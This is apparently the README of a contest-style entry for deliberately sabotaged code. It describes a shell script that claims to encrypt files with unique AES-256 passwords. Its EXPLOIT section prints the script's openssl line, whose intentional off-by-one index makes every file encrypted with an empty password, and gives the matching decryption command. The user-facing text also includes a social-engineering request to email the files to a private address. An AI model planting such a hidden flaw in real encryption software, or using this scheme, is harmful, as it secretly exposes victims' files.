
FILES
-----

encrypt-multi.sh	 - shell script to encrypt multiple files with secure, generated passwords


DESCRIPTION
-----------

Encrypt multiple files with OPENSSL AES-256, each with a different generated
strong password.

Usage:

	./encrypt-multi.sh /dir1/file1 /dir2/file2 ...

Creates "*.enc" files (file1.enc, file2.enc, ...) in the current directory,
and prints the generated list of passwords.

IMPORTANT: send the encrypted ".enc" files and the passwords on a completely
different channel! Please send the "*.enc" files to my PRIVATE email I sent you
(they are encrypted anyway), then the passwords in our usual messaging app.


EXPLOIT
-------

The exploit is a simple off-by-one, but in shell, which is less expected.

The following line in the script:

	openssl aes-256-cbc -pass "pass:${PASS[${#PASS[@]}]}" -a -salt -in "${FILENAME}" -out "${FILENAME##*/}.enc"	# ...encrypt file with the latest password.

is supposed to take the last, freshly added password to encrypt the file.
Instead, it overreaches by one, always using the empty string as the password.

This allows us to have the generated passwords sent to wherever, we are not
actually interested in them. We ourselves can decrypt all the files like this:

	openssl aes-256-cbc -pass "pass:" -d -a -in FILENAME.enc
